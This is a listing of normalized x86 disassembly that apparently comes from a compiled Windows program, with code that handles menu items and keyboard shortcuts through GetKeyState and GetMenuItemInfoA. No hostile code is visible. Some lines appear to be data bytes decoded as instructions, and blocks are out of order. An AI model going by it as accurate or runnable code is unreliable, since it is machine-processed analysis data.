call sub_409374
mov eax [ eax + 0x24 ]
mov edx r-xdata
call sub_44ce70
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1e ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_40a14c
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
mov [ ebp - 0x28 ] eax
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x1c ]
call sub_409374
cmp [ eax + 0x32 ] 0x0
je r-xdata
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x1c ]
call sub_409374
cmp [ eax + 0x24 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_44c070
mov eax [ ebp - 0x24 ]
call sub_44c070
mov eax [ ebp - 0x14 ]
call sub_44c070
mov eax [ ebp - 0xc ]
call sub_44c070
retn
inc eax
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x28 ] 0x0
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_40a14c
pop ecx
mov eax [ ebp - 0x3c ]
call sub_44cd60
cmp eax [ ebp - 0x30 ]
jge r-xdata
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x1c ]
call sub_409374
mov eax [ eax + 0x24 ]
lea edx [ ebp - 0x4c ]
call sub_40c9fc
mov eax [ ebp - 0x4c ]
lea edx [ ebp - 0x38 ]
call sub_446180
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x24
mov edx [ ebp - 0x3c ]
call sub_44cb34
inc [ ebp - 0x28 ]
dec [ ebp - 0x44 ]
jne r-xdata
mov edx [ ebp - 0x3c ]
mov eax r-xdata
call sub_4484f4
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x3c ]
mov edx [ ebp - 0x30 ]
mov al [ eax + edx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec [ ebp - 0x28 ]
cmp [ ebp - 0x28 ] 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x38 ]
call sub_4484f4
test eax eax
je r-xdata
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x1c ]
call sub_409374
push eax
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x1c ]
call sub_409374
mov ecx [ eax + 0x24 ]
xor edx edx
mov eax [ ebp - 0x24 ]
call sub_43dbd4
jmp r-xdata
lea ecx [ ebp - 0x3c ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
inc [ ebp - 0x2c ]
dec [ ebp - 0x44 ]
jne r-xdata
inc eax
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x28 ] 0x0
lea eax [ ebp - 0x54 ]
push eax
mov ecx 0x1
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x3c ]
call sub_44cf68
mov eax [ ebp - 0x54 ]
lea edx [ ebp - 0x38 ]
call sub_446180
push ebp
mov eax [ ebp - 0x38 ]
call sub_40a108
pop ecx
test al al
je r-xdata
inc [ ebp - 0x30 ]
jmp r-xdata
lea ecx [ ebp - 0x3c ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov [ ebp - 0x30 ] 0x1
jmp r-xdata
push ebp
mov eax [ ebp - 0x38 ]
call sub_40a108
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x3c ]
mov eax r-xdata
call sub_4484f4
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x40 ]
call sub_44cb78
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
cmp eax 0x0
jl r-xdata
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x24 ]
call sub_43db88
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x24 ]
mov ebx [ eax ]
call [ ebx + 0x60 ]
inc [ ebp - 0x28 ]
dec [ ebp - 0x48 ]
jne r-xdata
inc [ ebp - 0x30 ]
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x1c ]
call sub_409374
add eax 0x24
push eax
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x1c ]
call sub_409374
mov eax [ eax + 0x24 ]
lea edx [ ebp - 0x50 ]
call sub_40c928
mov edx [ ebp - 0x50 ]
pop eax
call sub_44cb34
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x1c ]
call sub_409374
push eax
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x1c ]
call sub_409374
mov ecx [ eax + 0x24 ]
xor edx edx
mov eax [ ebp - 0x24 ]
call sub_43dbd4
push ebp
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_44cd60
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_44cf68
mov edx [ ebp - 0x58 ]
lea eax [ ebp - 0x3c ]
xor ecx ecx
call sub_40a1dc
pop ecx
mov eax [ ebp - 0x18 ]
call sub_44cd60
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_44cfa8
lea edx [ ebp - 0x3c ]
mov ecx [ ebp - 0x30 ]
mov eax r-xdata
call sub_44cff0
push ebp
lea eax [ ebp - 0x3c ]
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x38 ]
call sub_40a1dc
pop ecx
jmp r-xdata
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
jmp r-xdata
sub_40a863
inc [ ecx ]
add [ eax ] al
add [ esi ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x2f ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2f ] al
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_40a89c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov edx r-xdata
call sub_44ce70
sete [ ebp - 0x5 ]
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_40a8cc
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x6 ] 0x0
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_409348
dec eax
pop edx
sub eax edx
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_409348
dec eax
pop edx
sub eax edx
jl r-xdata
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] edx
mov al [ ebp - 0x6 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40aad0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_409348
dec eax
mov edx [ ebp - 0x10 ]
sub edx eax
jg r-xdata
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] edx
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_409374
call sub_40a89c
test al al
je r-xdata
dec edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_409374
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_409374
cmp [ eax + 0x32 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_409374
mov [ eax + 0x32 ] 0x0
mov [ ebp - 0x6 ] 0x1
jmp r-xdata
dec [ ebp - 0xc ]
inc [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_409374
call sub_40a89c
test al al
je r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_409374
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ eax + 0x32 ] 0x0
mov [ ebp - 0x6 ] 0x1
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_409374
cmp [ eax + 0x32 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_409374
mov [ eax + 0x32 ] 0x0
mov [ ebp - 0x6 ] 0x1
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_409374
call sub_40a89c
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov [ eax + 0x32 ] 0x1
mov [ ebp - 0x6 ] 0x1
sub_40aa50
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x30 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] al
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_40aa80
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2f ]
mov [ ebp - 0x6 ] al
cmp [ ebp - 0x6 ] 0x2
jne r-xdata
xor eax eax
mov al [ ebp - 0x6 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_40aa80
and eax 0x7f
mov al [ eax + rw-data ]
mov [ ebp - 0x6 ] al
sub_40aad0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x6 ] al
cmp [ ebp - 0x6 ] 0x2
jne r-xdata
xor eax eax
mov al [ ebp - 0x6 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_40aad0
and eax 0x7f
mov al [ eax + rw-data ]
mov [ ebp - 0x6 ] al
sub_40ab20
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4070b8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x7c ] edx
mov edx [ edx ]
mov edx [ edx + 0x38 ]
mov [ eax + 0x78 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x35 ] 0x1
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_442100
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x2f ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_40bbc8
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_40abe4
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
call sub_44c070
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44215c
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_40ac2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov bx 0xfffd
call sub_44c24c
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_40ac58
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_4077f8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_40ac78
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov bx 0xfffa
call sub_44c24c
pop ebx
mov esp ebp
pop ebp
retn
sub_40aca4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax sub_40aca4
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x5c ]
call sub_406b74
push 0x1
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40990c
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_40acdc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x5c ]
mov eax sub_40aca4
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x28 ]
call sub_406b74
pop ecx
pop ebp
retn
sub_40ad00
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x44 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x28 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax - 0xc ] edx
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_409348
dec eax
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x54 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_409374
call sub_40ad00
pop ecx
test al al
je r-xdata
sub_40adb0
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x5c ]
mov eax sub_40ad00
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0x28 ]
call sub_406b74
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov esp ebp
pop ebp
retn
sub_40adec
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x15 ] 0x1
cmp [ ebp - 0x9 ] 0x0
je r-xdata
cmp [ ebp - 0x15 ] 0x1
jne r-xdata
mov [ ebp - 0x15 ] 0x0
mov cl [ ebp - 0x15 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40adb0
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40c5c4
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x58 ]
mov [ ebp - 0x14 ] eax
sub_40ae84
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x7 ] 0x0
movzx edx [ ebp - 0x6 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_40adb0
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov al [ ebp - 0x7 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov [ ebp - 0x7 ] 0x1
sub_40aec0
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov cl 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40adb0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp - 0x10 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x40 ]
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_40a364
mov [ ebp - 0x11 ] al
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_40a8cc
or al [ ebp - 0x11 ]
mov [ ebp - 0x11 ] al
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
call sub_409aa0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_409aa0
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x10 ]
call sub_4076c8
sub_40af60
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3c ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_40af8c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
mov [ ebp - 0xc ] eax
dec [ ebp - 0x8 ]
sub_40afc0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov eax [ eax + 0x58 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
inc edx
lea eax [ ebp - 0x10 ]
call sub_40afc0
pop ecx
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x9 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
cmp [ eax + 0x2d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x0
xor eax eax
push ebp
push sub_40b110
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_40adb0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x54 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_409aa0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_40af8c
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x3
jmp r-xdata
mov [ ebp - 0x9 ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov eax [ eax + 0x58 ]
cmp eax [ ebp - 0x10 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x54 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x9 ] 0x1
sub_40b13c
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x4 ]
mov [ ebp - 0x6 ] ax
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
mov eax [ ebp - 0x10 ]
test [ eax + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov [ ebp - 0x12 ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_40adb0
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x12 ] 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_402240
xor eax eax
push ebp
push sub_40b1e3
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_40afc0
pop ecx
mov [ ebp - 0x12 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_402224
retn
cmp [ ebp - 0x4 ] 0x0
setne [ ebp - 0x11 ]
mov al [ ebp - 0x11 ]
mov esp ebp
pop ebp
retn
sub_40b200
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x35 ]
xor al 0x1
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_40b21c
push ebp
mov ebp esp
add esp 0xffffff78
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0x9 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x38 ] 0x2c
mov [ ebp - 0x34 ] 0x10
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x50
lea eax [ ebp - 0x38 ]
push eax
push 0xffffffff
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40b6b8
mov edx [ ebp - 0x30 ]
and edx 0x6000
neg edx
sbb edx edx
neg edx
